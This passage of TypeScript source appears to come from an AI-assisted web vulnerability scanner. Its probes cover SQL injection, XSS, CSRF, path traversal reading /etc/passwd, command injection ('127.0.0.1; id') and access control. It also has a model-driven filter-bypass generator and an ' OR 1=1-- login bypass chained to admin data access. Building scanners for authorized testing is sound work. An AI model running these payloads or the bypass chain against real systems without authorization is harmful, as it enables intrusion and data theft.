): Promise<AttemptResult> {
  if (isMutatingSurface(opts)) return mutatingSkip(technique);
  let last: AttemptResult | undefined;

  for (const field of candidateFields(opts)) {
    // 1) Error-based: an unmatched quote-pair should trip a DB parse error that
    //    leaks the engine (and often a framework banner).
    const quote = injectionRequest(opts, field, `'"`);
    const sent = await rawSend(session, quote.req, quote.label);
    if (sent.kind === "result") {
      last = sent.result;
      continue;
    }
    const { res, scan, base } = sent;

    if (
      SQL_ERROR.test(scan) &&
      !SHELL_ERROR.test(scan) &&
      (await signalIsPayloadCaused(session, opts, field, benignControlValue(), SQL_ERROR))
    ) {
      const banner = bannerArtifact(scan, technique);
      return {
        ok: true,
        note: `${technique}: DB error surfaced by a quote probe on '${field ?? "q"}' and absent from a benign control (error-based SQLi signal)`,
        applicable: true,
        ...(banner ? { discovered: [banner] } : {}),
        ...base,
      };
    }

    // 2) Boolean-based: an app can swallow the engine error (a generic 500 or
    //    "Internal Error" page) yet still build the query by concatenation. Two
    //    payloads that differ ONLY in a boolean — an always-false `AND '1'='2` and
    //    an always-true `OR '1'='1` — then return different result sets, while an
    //    uninjectable endpoint returns the same for both. More rows under the true
    //    condition is the classic oracle: injected logic changed the query. This is
    //    SELECT-side only — it reads rows, it writes nothing.
    const marker = `nf${Math.random().toString(36).slice(2, 8)}`;
    const falseInj = injectionRequest(opts, field, `${marker}${SQLI_FALSE}`);
    const trueInj = injectionRequest(opts, field, `${marker}${SQLI_TAUTOLOGY}`);
    const falseRes = await rawSend(session, falseInj.req);
    const trueRes = await rawSend(session, trueInj.req, trueInj.label);
    if (falseRes.kind === "ok" && trueRes.kind === "ok") {
      const falseRows = resultShape(falseRes.res.body);
      const trueRows = resultShape(trueRes.res.body);
      if (trueRows > falseRows && trueRows >= 1) {
        return {
          ok: true,
          note: `${technique}: always-true condition returned ${trueRows} record(s) vs ${falseRows} for always-false on '${field ?? "q"}' — boolean-based SQLi`,
          applicable: true,
          basis:
            "Impact-confirmed: two requests differing only in a boolean (' OR '1'='1 vs ' AND '1'='2) returned different result sets, so the injected logic actually altered the query and read rows unauthorized. The probe injects SELECT-side logic only — it reads, it writes nothing.",
          evidence: {
            request: trueInj.label,
            response: trueRes.snippet,
            note: `always-false → ${falseRows} record-rows; always-true → ${trueRows}`,
          },
          status: trueRes.res.status,
        };
      }
    }

    // 2b) Boolean-based in a NUMERIC context: the sink concatenates the value
    //     without quotes (`WHERE id=<value>`), so the quoted probes above only
    //     provoke a parse error — and that error appears under a benign value too
    //     (an unquoted `nf…` is itself an invalid column reference), so the
    //     error-based control differential correctly suppresses it. Two unquoted
    //     boolean payloads — always-true `0 OR 1=1` (every row) and always-false
    //     `0 AND 1=1` (no row) — return different result sets when the value lands
    //     in a numeric predicate, and identical ones (literal strings, or both
    //     erroring) when it does not, so this never confirms outside a real
    //     numeric injection. SELECT-side only — it reads rows, it writes nothing.
    const numFalse = injectionRequest(opts, field, SQLI_NUM_FALSE);
    const numTrue = injectionRequest(opts, field, SQLI_NUM_TRUE);
    const numFalseRes = await rawSend(session, numFalse.req);
    const numTrueRes = await rawSend(session, numTrue.req, numTrue.label);
    if (numFalseRes.kind === "ok" && numTrueRes.kind === "ok") {
      const numFalseRows = resultShape(numFalseRes.res.body);
      const numTrueRows = resultShape(numTrueRes.res.body);
      if (numTrueRows > numFalseRows && numTrueRows >= 1) {
        return {
          ok: true,
          note: `${technique}: always-true numeric condition returned ${numTrueRows} record(s) vs ${numFalseRows} for always-false on '${field ?? "q"}' — boolean-based SQLi (numeric context)`,
          applicable: true,
          basis:
            "Impact-confirmed: two requests differing only in an unquoted boolean (0 OR 1=1 vs 0 AND 1=1) returned different result sets, so the injected logic altered a numeric-context query and read rows unauthorized. The probe injects SELECT-side logic only — it reads, it writes nothing.",
          evidence: {
            request: numTrue.label,
            response: numTrueRes.snippet,
            note: `always-false → ${numFalseRows} record-rows; always-true → ${numTrueRows}`,
          },
          status: numTrueRes.res.status,
        };
      }
    }

    // Fixed payloads drew no signal — but the sink may be injectable behind an
    // input filter that neutralizes the FIXED payload set (an OR/AND blacklist, a
    // space/comment stripper, a WAF). The deterministic floor cannot adapt; the
    // model can. If a payload smith is wired, hand it the filter's observed
    // behaviour and confirm any proposal against the app's own true/false
    // fingerprint — so a bypass counts only when it actually works.
    if (opts.payloadSmith) {
      const adapted = await modelBypassConfirm(session, technique, opts, field);
      if (adapted) return adapted;
    }

    // No signal on this field: remember the stable status contract and move on.
    last = statusResult(res, base) ?? {
      ok: false,
      note: `${technique}: no DB error or boolean differential`,
      applicable: true,
      ...base,
    };
  }

  return last ?? { ok: false, applicable: true, note: `${technique}: no injectable parameter` };
}

/** Alphabetic tokens (≥3 letters) of a response, HTML stripped — the unit a
 *  blind true/false fingerprint is built from. Numeric tokens are excluded so a
 *  reflected id value never contaminates the fingerprint. */
function contentTokens(body: string): Set<string> {
  const out = new Set<string>();
  for (const m of body.replace(/<[^>]+>/g, " ").matchAll(/[A-Za-z]{3,}/g)) {
    out.add(m[0].toLowerCase());
  }
  return out;
}

/** The value already bound to this field (recon's captured default, or the
 *  query-string value) — the natural input that returns the row; "1" otherwise. */
function naturalValue(opts: AttemptOpts, field: string): string {
  if (opts.formData?.[field]) return opts.formData[field];
  try {
    const v = new URL(opts.url).searchParams.get(field);
    if (v) return v;
  } catch {
    /* non-URL target */
  }
  return "1";
}

/** Keep a model-proposed payload only if it is a single short, printable line —
 *  never trust the model's output into a request unchecked. */
function sanitizePayload(s: unknown): string {
  if (typeof s !== "string") return "";
  const t = s.trim();
  if (!t || t.length > 120) return "";
  for (let i = 0; i < t.length; i++) {
    const c = t.charCodeAt(i);
    if (c === 0x00 || c === 0x0a || c === 0x0d) return "";
  }
  return t;
}

/**
 * The one place model reasoning confirms a vuln the fixed floor cannot. When the
 * deterministic SQLi probes draw no signal, an input filter may be neutralizing
 * the FIXED payloads rather than the sink being safe. This:
 *   1. fingerprints the app's OWN true/false response (the row-bearing natural
 *      value vs a guaranteed-no-row value); bails if there is no observable
 *      oracle, so a dead parameter never escalates;
 *   2. asks the model for boolean-oracle bypass pairs tailored to the filter;
 *   3. confirms a pair ONLY when its true-payload reproduces the row fingerprint
 *      and its false-payload suppresses it — the app's demonstrated differential,
 *      never the model's word. A hallucinated payload that does not work yields
 *      nothing, so this cannot introduce a false positive. SELECT-side, read-only.
 */
async function modelBypassConfirm(
  session: Session,
  technique: string,
  opts: AttemptOpts,
  field: string | undefined,
): Promise<AttemptResult | undefined> {
  const smith = opts.payloadSmith;
  if (!smith || !field) return undefined;

  const refSent = await rawSend(
    session,
    injectionRequest(opts, field, naturalValue(opts, field)).req,
  );
  const falseSent = await rawSend(session, injectionRequest(opts, field, NO_ROW_VALUE).req);
  if (refSent.kind !== "ok" || falseSent.kind !== "ok") return undefined;
  const noRowTokens = contentTokens(falseSent.res.body);
  const fingerprint = [...contentTokens(refSent.res.body)].filter((t) => !noRowTokens.has(t));
  if (fingerprint.length === 0) return undefined; // no observable oracle → never escalate

  const brief: FilterBrief = {
    field,
    url: opts.url,
    method: opts.method ?? "GET",
    observations: [
      "A fixed boolean probe (' OR '1'='1 / 0 OR 1=1) returned the no-row page — an input filter likely strips or rewrites the payload.",
      "A quote probe ('\") raised no database error, so errors are suppressed (blind) and only a true/false response differential is observable.",
    ],
  };
  let pairs: Array<{ t: string; f: string }>;
  try {
    pairs = (await smith(brief)).slice(0, MAX_BYPASS_PAIRS);
  } catch {
    return undefined;
  }
  if (pairs.length === 0) return undefined;

  for (const pair of pairs) {
    const t = sanitizePayload(pair.t);
    const f = sanitizePayload(pair.f);
    if (!t || !f || t === f) continue;
    const tReq = injectionRequest(opts, field, t);
    const tSent = await rawSend(session, tReq.req, tReq.label);
    const fSent = await rawSend(session, injectionRequest(opts, field, f).req);
    if (tSent.kind !== "ok" || fSent.kind !== "ok") continue;
    const tTokens = contentTokens(tSent.res.body);
    const fTokens = contentTokens(fSent.res.body);
    const trueReproducesRow = fingerprint.every((tok) => tTokens.has(tok));
    const falseSuppressesRow = !fingerprint.some((tok) => fTokens.has(tok));
    if (trueReproducesRow && falseSuppressesRow) {
      bus.emit("exploit.adapt", { field, candidates: pairs.length, confirmed: true });
      return {
        ok: true,
        note: `${technique}: fixed probes were filtered; a model-synthesized bypass ('${t}' vs '${f}') reproduced the app's true/false response split on '${field}' — boolean-based SQLi behind an input filter`,
        applicable: true,
        basis:
          "Impact-confirmed: the deterministic fixed-payload probes were neutralized by an input filter, so the model reasoned about the filter and proposed a bypass; two requests differing only in the injected boolean then reproduced the application's OWN row-present vs row-absent fingerprint. Confirmation is the app's demonstrated differential, not the model's claim. SELECT-side only — it reads rows, it writes nothing.",
        evidence: {
          request: tReq.label,
          response: tSent.snippet,
          note: `model bypass true='${t}' reproduced the row fingerprint; false='${f}' suppressed it`,
        },
        status: tSent.res.status,
      };
    }
  }
  bus.emit("exploit.adapt", { field, candidates: pairs.length, confirmed: false });
  return undefined;
}

// A benign reflection marker. The angle brackets are the signal: if they come
// back un-encoded in an HTML body, the sink does not escape — no script runs.
const XSS_MARKER = "nfx7q9<i>";

/**
 * Reflected XSS — non-destructive: send a benign marker and confirm its angle
 * brackets are echoed verbatim (un-escaped) into an HTML response. No active
 * script payload, no execution.
 */
async function xssCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  if (isMutatingSurface(opts)) return mutatingSkip(technique);
  let last: AttemptResult | undefined;
  for (const field of candidateFields(opts)) {
    const { req, label } = injectionRequest(opts, field, XSS_MARKER);
    const sent = await send(session, req, label);
    if (sent.kind === "result") {
      last = sent.result;
      continue;
    }
    const { res, snippet, scan, base } = sent;
    const ctype = (res.headers["content-type"] ?? res.headers["Content-Type"] ?? "").toLowerCase();
    const isHtml = ctype.includes("html") || snippet.trimStart().startsWith("<");
    if (isHtml && scan.includes(XSS_MARKER)) {
      return {
        ok: true,
        note: `${technique}: marker reflected un-escaped into HTML via '${field ?? "q"}' (reflected-XSS signal)`,
        applicable: true,
        ...base,
      };
    }
    last = {
      ok: false,
      note: `${technique}: marker not reflected un-escaped`,
      applicable: true,
      ...base,
    };
  }
  return last ?? { ok: false, applicable: true, note: `${technique}: no injectable parameter` };
}

/**
 * CSRF — non-destructive: fetch the surface and inspect whether a session
 * cookie is issued without SameSite protection and no anti-CSRF token is in
 * play. GET-only; it never submits a forged state-changing request.
 */
async function csrfCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  const sent = await send(session, { url: opts.url });
  if (sent.kind === "result") return sent.result;
  const { res, scan, base } = sent;

  const setCookie = (res.headers["set-cookie"] ?? res.headers["Set-Cookie"] ?? "").toLowerCase();
  const hasSession = /sess|sid|token|auth|connect\.sid/.test(setCookie);
  const sameSite = setCookie.includes("samesite");
  const hasAntiCsrf =
    /csrf|xsrf/i.test(JSON.stringify(res.headers)) || /csrf|xsrf|_token/i.test(scan);

  if (hasSession && !sameSite && !hasAntiCsrf) {
    return {
      ok: true,
      note: `${technique}: session cookie set without SameSite and no anti-CSRF token (CSRF-exposed)`,
      applicable: true,
      ...base,
    };
  }
  return {
    ok: false,
    note: `${technique}: CSRF defenses present or no session cookie issued`,
    applicable: true,
    ...base,
  };
}

const TRAVERSAL_HIT =
  /root:[x*]?:0:0:|\[boot loader\]|\[fonts\]|; for 16-bit app support|daemon:.*:\/usr\/sbin/i;

// A vulnerable include reads the same host file whether it takes an ABSOLUTE path
// (`?file=/etc/passwd`, as XVWA does) or needs enough `../` to climb out of a
// deeply-nested endpoint directory (`/var/www/html/app/vulnerabilities/fi/` is
// six levels below `/`). A single fixed depth silently misses both: a 4-dot probe
// never leaves a six-deep directory, so a real flaw reads as a clean negative.
// Probe the absolute path plus a range of depths — excess `../` collapses at the
// root, so an over-deep sequence is harmless. Every payload names the same benign,
// world-readable file: read-only, writes nothing.
const TRAVERSAL_PAYLOADS = [
  "/etc/passwd",
  "../../../etc/passwd",
  "../../../../../etc/passwd",
  "../../../../../../../etc/passwd",
  "../../../../../../../../../../etc/passwd",
];

/**
 * Path traversal / file inclusion — non-destructive read: ask for a file above
 * the web root via an absolute path or a dot-dot sequence and confirm host-file
 * contents leak. It only reads; it writes nothing.
 */
async function pathTraversalCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  if (isMutatingSurface(opts)) return mutatingSkip(technique);
  let last: AttemptResult | undefined;
  for (const field of candidateFields(opts)) {
    for (const payload of TRAVERSAL_PAYLOADS) {
      const { req, label } = injectionRequest(opts, field, payload, "file");
      const sent = await send(session, req, label);
      if (sent.kind === "result") {
        last = sent.result;
        break; // a hard status (404/405/5xx) is a property of the field, not the depth
      }
      const { scan, base } = sent;
      if (
        TRAVERSAL_HIT.test(scan) &&
        (await signalIsPayloadCaused(
          session,
          opts,
          field,
          benignControlValue(),
          TRAVERSAL_HIT,
          "file",
        ))
      ) {
        return {
          ok: true,
          note: `${technique}: host file contents leaked via '${field ?? "file"}' (${payload}) and absent from a benign control (path-traversal signal)`,
          applicable: true,
          ...base,
        };
      }
      last = {
        ok: false,
        note: `${technique}: no file contents leaked`,
        applicable: true,
        ...base,
      };
    }
  }
  return last ?? { ok: false, applicable: true, note: `${technique}: no injectable parameter` };
}

const CMD_OUTPUT = /uid=\d+\(.*?\)\s+gid=\d+\(|total \d+\s+drwx|root:[x*]?:0:0:/i;

/**
 * Separator probes, each benign-prefixed with a routable host. The prefix matters:
 * a bare `; id` leaves a host-expecting command (ping/nslookup/dig/host) with no
 * argument, and some of those block on an empty arg until the request times out —
 * the inert `id` then never runs and a real flaw reads as a plain negative. A valid
 * host lets the first command return promptly, so the appended `id` runs regardless
 * of the sink. Two separators cover the common shell contexts (`;` always runs the
 * second command; `|` runs it even when the first fails, as a non-host sink does).
 */
const CMD_PAYLOADS = ["127.0.0.1; id", "127.0.0.1 | id"];

/**
 * Command injection — the most invasive class, kept deliberately conservative:
 * benign, inert separator probes (append `id`, read nothing destructive) and a
 * check for shell-output signatures. It confirms only on clear evidence and
 * otherwise reports a plain negative — no destructive payloads, no blind
 * time-based escalation.
 */
async function commandInjectionCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  if (isMutatingSurface(opts)) return mutatingSkip(technique);
  let last: AttemptResult | undefined;
  for (const field of candidateFields(opts)) {
    for (const payload of CMD_PAYLOADS) {
      const { req, label } = injectionRequest(opts, field, payload);
      const sent = await send(session, req, label);
      if (sent.kind === "result") {
        last = sent.result;
        continue;
      }
      const { scan, base } = sent;
      if (
        CMD_OUTPUT.test(scan) &&
        (await signalIsPayloadCaused(session, opts, field, "127.0.0.1", CMD_OUTPUT))
      ) {
        return {
          ok: true,
          note: `${technique}: shell command output observed via '${field ?? "q"}' and absent from a benign control (command-injection signal)`,
          applicable: true,
          ...base,
        };
      }
      last = {
        ok: false,
        note: `${technique}: no command output observed`,
        applicable: true,
        ...base,
      };
    }
  }
  return last ?? { ok: false, applicable: true, note: `${technique}: no injectable parameter` };
}

// An auth wall: a 401/403, or a login page a dropped/expired session was
// redirected to. A word from the objective echoing on a login screen ("Admin
// login") is NOT the objective reached — treating it as a finding is the
// classic session-expiry false positive on an unfamiliar target.
// A credential-entry field (strong) and a login affordance (strong). A LONE
// password field is NOT enough — an admin page with a change-password widget has
// one, and discarding that as "a login wall" would turn the false positive we
// fixed into its mirror image (a real finding dropped). Require BOTH signals, so
// only a page that is actually a login screen is treated as an auth wall.
const PASSWORD_FIELD = /<input[^>]+type=["']?password|name=["']?(?:password|passwd|pwd)\b/i;
const LOGIN_AFFORDANCE =
  /action=["'][^"']*\blog[-_]?in\b|\b(?:log[\s-]?in|sign[\s-]?in)\s+to\s+(?:continue|your\s+account|proceed)|<(?:h1|h2|title)[^>]*>[^<]*\b(?:log[\s-]?in|sign[\s-]?in)\b/i;

// An auth wall: an auth-failure status (robust, content-independent), or a body
// that is unmistakably a login screen (credential field AND a login affordance).
// Status 401/403 is the primary signal; the body heuristic only corroborates the
// redirect-to-a-200-login-page case and is deliberately conservative. A SPA that
// returns a 200 shell and redirects to login client-side can still slip past the
// HTTP-tier body check — a documented residual, covered by the Tier-2 browser.
function isAuthWall(status: number, body: string): boolean {
  if (status === 401 || status === 403) return true;
  return PASSWORD_FIELD.test(body) && LOGIN_AFFORDANCE.test(body);
}

/** GET `url` and report whether a reachable page matches the objective tokens. */
async function probeObjective(
  session: Session,
  technique: string,
  url: string,
  hint: string[],
): Promise<AttemptResult> {
  const sent = await send(session, { url });
  if (sent.kind === "result") return sent.result;
  const { res, snippet, base } = sent;

  // A dropped session reads as an auth wall, never as the objective — otherwise
  // an expired-cookie redirect to a 200 login page would confirm falsely.
  if (isAuthWall(res.status, snippet)) {
    return {
      ok: false,
      applicable: false,
      note: `${technique}: auth wall (${res.status}) — session absent/expired, objective not reached`,
      ...base,
    };
  }

  const hay = `${url} ${snippet}`.toLowerCase();
  const matched = hint.filter((t) => t.length > 2 && hay.includes(t));
  if (res.status < 400 && matched.length > 0) {
    return {
      ok: true,
      note: `${technique}: reached objective signal [${matched.join(", ")}] at ${res.status}`,
      applicable: true,
      ...base,
    };
  }
  return {
    ok: false,
    note: `${technique}: reachable (${res.status}), no objective signal`,
    applicable: true,
    ...base,
  };
}

/**
 * Two-principal broken-access-control differential (OWASP A01, function-level
 * authorization). The primary `session` is the principal under test — the lower-
 * privilege account, listed first in scope. A finding requires, in order:
 *
 *   1. the primary principal reaches the surface with the objective signal;
 *   2. the surface is privilege-denoting (admin/management/config) — not a public
 *      or per-user feature page;
 *   3. an anonymous request to the same surface is DENIED (an auth wall), proving
 *      the surface is access-controlled, so reaching it is a real boundary cross;
 *   4. when an elevated principal is supplied, it ALSO reaches the surface,
 *      confirming shared administrative functionality rather than a resource that
 *      is simply the primary principal's own.
 *
 * Each gate independently rejects a false-positive class the removed single-
 * principal keyword match could not: public pages (step 3 — the anon request
 * reaches them), authorized admin use (the primary principal is non-admin by
 * scope, enforced by the caller), and per-user resources (step 4). A failed login
 * collapses the primary into an anonymous principal, in which case step 1 or 3
 * fails and nothing is flagged — so the differential cannot manufacture a finding
 * from a broken login either. Every request is a read-only GET.
 */
async function accessControlDifferential(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  const hint = opts.objectiveHint ?? [];
  const url = opts.url;

  const direct = await probeObjective(session, technique, url, hint);
  if (!direct.ok) return direct;

  const carry = {
    applicable: true as const,
    status: direct.status,
    ...(direct.evidence ? { evidence: direct.evidence } : {}),
  };

  if (!isPrivilegedSurface(url)) {
    return {
      ok: false,
      ...carry,
      note: `${technique}: reachable (${direct.status ?? 200}) but not a privilege-denoting surface — authorized access is not broken access control`,
    };
  }

  const anon = opts.baseline ? await rawSend(opts.baseline, { url }) : undefined;
  const anonDenied =
    anon?.kind === "ok" && (isAuthWall(anon.res.status, anon.scan) || anon.res.status >= 400);
  if (!anonDenied) {
    return {
      ok: false,
      ...carry,
      note: `${technique}: the same surface is reachable anonymously — public, not broken access control`,
    };
  }

  if (opts.elevated) {
    const elevated = await probeObjective(opts.elevated, technique, url, hint);
    if (!elevated.ok) {
      return {
        ok: false,
        ...carry,
        note: `${technique}: the elevated principal does not serve this surface — cannot confirm shared privileged functionality, under-claiming`,
      };
    }
  }

  const basis = opts.elevated
    ? "Impact-confirmed: a lower-privilege authenticated principal reached an administrative surface that an anonymous request is denied and that the elevated principal also serves — a proven function-level authorization gap (vertical privilege escalation). The probe only reads the surface; it changes no state."
    : "Signal-based: a lower-privilege authenticated principal reached an administrative surface that an anonymous request is denied. Add an elevated principal to the scope to confirm shared privileged functionality end to end.";

  return {
    ok: true,
    ...carry,
    note: `${technique}: lower-privilege principal reached privilege-denoting surface ${url} that anonymous access is denied — broken function-level authorization`,
    basis,
  };
}

/**
 * Broken access control / baseline probe (also the fallback for unrecognized
 * techniques): a plain GET of a gated surface. Confirms when a reachable page
 * matches the objective tokens — e.g. an admin surface served without the
 * expected auth, provable without any payload. When `steer` is set (a
 * broken-access-intent technique) and it is handed only the site root, it also
 * reaches the known admin surface, since that is where the access signal lives
 * and the root shell alone rarely carries the objective tokens. Unrecognized
 * techniques pass `steer: false`, so they never confirm off a surface the
 * candidate didn't name.
 */
async function accessControlCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
  steer: boolean,
): Promise<AttemptResult> {
  const hint = opts.objectiveHint ?? [];
  // On an authenticated run (operator credentials), reaching a resource the
  // principal is authorized for is expected — not broken access control. With no
  // lower-privilege baseline to compare against, a reachable+keyword match can't
  // soundly prove a boundary violation, so we under-claim rather than flag every
  // authenticated feature page. (Unauthenticated BAC confirmation is unaffected:
  // reaching a gated surface with no session remains a finding.)
  if (opts.authenticated) {
    // With a baseline to diff against, a lower-privilege principal reaching a
    // gated administrative surface is a provable broken-access-control finding
    // (two-principal differential below). Without one, a single authenticated
    // session reaching a resource is expected, not a boundary violation, so we
    // under-claim rather than flag an authorized feature page.
    if (opts.baseline) return accessControlDifferential(session, technique, opts);
    return {
      ok: false,
      applicable: true,
      note: `${technique}: authenticated principal reaching an authorized resource — not broken access control (no lower-privilege baseline)`,
    };
  }
  // A public authentication-entry page (login/register/password-recovery) is
  // served to anonymous callers by design — authorization is not expected there,
  // so it can never be a broken-access-control finding, whatever objective words
  // its chrome echoes. Guarded by URL so a truncated body can't defeat it.
  if (isPublicAuthEntry(opts.url)) {
    return {
      ok: false,
      applicable: true,
      note: `${technique}: ${opts.url} is a public auth-entry surface — authorization not expected, not broken access`,
    };
  }
  // An unrecognized technique handed only the site root has no specific surface
  // to prove anything against — an objective word appearing on the landing page
  // is not evidence of broken access, so it must not confirm there.
  if (!steer && isRoot(opts.url)) {
    return {
      ok: false,
      applicable: true,
      note: `${technique}: no specific in-scope surface to probe`,
    };
  }
  const direct = await probeObjective(session, technique, opts.url, hint);
  // A reachable page that echoes an objective word is only broken access control
  // when the surface itself is privilege-denoting (admin/config/management). A
  // public catalog/search/contact page is reachable by design — confirming it is
  // the systematic false positive a multi-lab run exposed. We down-grade such a
  // hit to "reachable, not a finding" rather than emit a wrong "Impact-confirmed".
  if (direct.ok && !isPrivilegedSurface(opts.url)) {
    return {
      ok: false,
      applicable: true,
      status: direct.status,
      ...(direct.evidence ? { evidence: direct.evidence } : {}),
      note: `${technique}: reachable (${direct.status ?? 200}) but not a privilege-denoting surface — public or authorized access is not broken access control`,
    };
  }
  if (direct.ok || !steer || !isRoot(opts.url)) return direct;

  // Root with no signal: try the known broken-access surface before giving up.
  // That surface is administrative by construction, so it needs no extra gate.
  const admin = surfaceFor(opts.url, ADMIN_CONFIG_SURFACE);
  if (admin === opts.url) return direct;
  const viaAdmin = await probeObjective(session, technique, admin, hint);
  return viaAdmin.ok ? viaAdmin : direct;
}

// --- the multi-step chain -------------------------------------------------

const TOKEN_RE = /"token"\s*:\s*"([^"]+)"/;

/** Show enough of a secret to prove it is real, without printing it in full. */
function redact(secret: string): string {
  if (secret.length <= 16) return "…[redacted]";
  return `${secret.slice(0, 16)}…[redacted, ${secret.length} chars]`;
}

/** Bound a response snippet for evidence. */
function clip(body: string, max = 800): string {
  return body.length <= max ? body : `${body.slice(0, max)}\n… [${body.length - max} more bytes]`;
}

/**
 * Step 1 of the chain — SQL injection in the authentication query. A non-
 * destructive login POST with `' OR 1=1--` in the email field: if the lookup is
 * built by string concatenation, it matches the first user (the administrator)
 * and the server hands back a valid session token with no password. The token
 * is published to the world-model and an authenticated follow-up is seeded. The
 * injection string only reads the auth table; it writes nothing.
 */
async function authBypassCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  const url = surfaceFor(opts.url, LOGIN_SURFACE);
  const payload = { email: "' OR 1=1--", password: "x" };
  const sent = await rawSend(
    session,
    {
      url,
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(payload),
    },
    `POST ${url}  {"email":"' OR 1=1--","password":"x"}`,
  );
  if (sent.kind === "result") return sent.result;
  const { res, snippet, scan, base } = sent;

  const m = scan.match(TOKEN_RE);
  if (res.status < 400 && m?.[1]) {
    const token = m[1];
    return {
      ok: true,
      reachesObjective: false,
      applicable: true,
      status: res.status,
      note: `${technique}: login returned a valid session token for an injected identity — authentication bypassed`,
      discovered: [{ kind: "token", value: token, label: "admin session JWT", from: technique }],
      next: [
        {
          technique: T_ADMIN_ACCESS,
          reason: "use the bypassed session token to reach an admin-only resource",
        },
      ],
      evidence: {
        request: base.evidence.request,
        response: snippet.replace(token, redact(token)),
        note: "`' OR 1=1--` in the email field returned HTTP 200 with a signed JWT and no valid credentials",
      },
    };
  }
  return {
    ok: false,
    note: `${technique}: injected login did not return a token (${res.status})`,
    applicable: true,
    ...base,
  };
}

/**
 * Step 2 of the chain — consume the bypassed token. Proves privilege escalation
 * by contrast: the admin-only endpoint is requested once WITHOUT the token
 * (expected 401/403) and once WITH it. A 2xx only when the token is attached is
 * authenticated access the agent was never granted — and reaching it satisfies
 * the objective. Read-only; it enumerates, it does not mutate.
 */
async function authenticatedAdminCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  const token = opts.context ? latestArtifact(opts.context, "token") : undefined;
  if (!token) {
    return {
      ok: false,
      applicable: false,
      note: `${technique}: no session token in the world-model yet`,
    };
  }
  const url = surfaceFor(opts.url, USERS_SURFACE);

  const unauth = await rawSend(session, { url }, `GET ${url}  (no token)`);
  const unauthStatus = unauth.kind === "ok" ? unauth.res.status : (unauth.result.status ?? 0);

  const sent = await send(
    session,
    { url, headers: { authorization: `Bearer ${token.value}` } },
    `GET ${url}  (Authorization: Bearer <bypassed admin JWT>)`,
  );
  if (sent.kind === "result") return sent.result;
  const { res, snippet, base } = sent;

  if (res.status < 400 && (unauthStatus === 401 || unauthStatus === 403)) {
    return {
      ok: true,
      reachesObjective: true,
      applicable: true,
      status: res.status,
      consumed: token.label,
      note: `${technique}: admin-only resource returned ${res.status} WITH the bypassed token but ${unauthStatus} without it — privilege escalation, objective reached`,
      discovered: [
        {
          kind: "data",
          value: clip(snippet, 400),
          label: "admin-only user records",
          from: technique,
        },
      ],
      evidence: {
        request: base.evidence.request,
        response: clip(snippet),
        note: `unauthenticated this endpoint returns ${unauthStatus}; with the JWT from step 1 it returns ${res.status} and admin-only data — authenticated access the agent was never granted`,
      },
    };
  }
  return {
    ok: false,
    note: `${technique}: admin endpoint returned ${res.status} (unauth ${unauthStatus}) — not a clean escalation`,
    applicable: true,
    ...base,
  };
}
